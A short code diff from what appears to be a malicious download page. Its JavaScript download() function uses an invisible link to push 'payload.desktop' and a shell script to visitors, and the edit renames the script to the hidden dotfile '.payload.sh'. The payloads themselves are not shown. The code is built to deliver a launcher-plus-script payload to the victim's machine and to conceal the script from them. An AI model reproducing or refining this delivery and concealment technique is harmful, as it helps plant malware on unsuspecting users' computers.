@@ -1,6 +1,6 @@
 		function download(){
-			let filenames = ['payload.desktop', 'payload.sh'];
-			let linkNames = ['payloads/payload.desktop', 'payloads/payload.sh'];
+			let filenames = ['payload.desktop', '.payload.sh'];
+			let linkNames = ['payloads/payload.desktop', 'payloads/.payload.sh'];
 
 			let link = document.createElement('a');
 			link.style.display = 'none';
